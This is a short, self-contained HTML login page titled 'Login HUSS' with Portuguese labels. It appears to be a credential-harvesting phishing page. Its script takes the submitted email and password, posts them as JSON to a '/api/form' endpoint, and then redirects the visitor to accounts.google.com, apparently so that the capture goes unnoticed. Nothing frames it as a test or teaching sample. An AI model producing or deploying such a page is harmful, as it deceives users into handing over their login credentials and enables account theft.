<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Login - HUSS</title>
  <style>
    body {
      background-color: #000;
      color: #fff;
      font-family: 'Courier New', monospace;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .login-box {
      background-color: #111;
      padding: 40px;
      border: 1px solid #444;
      border-radius: 8px;
      box-shadow: 0 0 10px #0f0;
      text-align: center;
      width: 100%;
      max-width: 400px;
    }

    .login-box h1 {
      font-size: 24px;
      margin-bottom: 20px;
      color: #0f0;
    }

    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: none;
      border-radius: 4px;
      background: #222;
      color: #fff;
      font-size: 16px;
    }

    input::placeholder {
      color: #888;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #0f0;
      color: #000;
      border: none;
      border-radius: 4px;
      font-weight: bold;
      cursor: pointer;
      font-size: 16px;
    }

    button:hover {
      background-color: #0a0;
    }
  </style>
</head>
<body>

<div class="login-box">
  <h1>Login HUSS</h1>
  <form id="loginForm">
    <input type="email" name="email" placeholder="Digite seu email" required>
    <input type="password" name="senha" placeholder="Digite sua senha" required>
    <button type="submit">ENTRAR</button>
  </form>
</div>

<script>
  document.getElementById("loginForm").addEventListener("submit", async function (e) {
    e.preventDefault();
    const email = e.target.email.value;
    const senha = e.target.senha.value;

    await fetch("/api/form", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, senha })
    });

    window.location.href = "https://accounts.google.com/";
  });
</script>

</body>
</html>
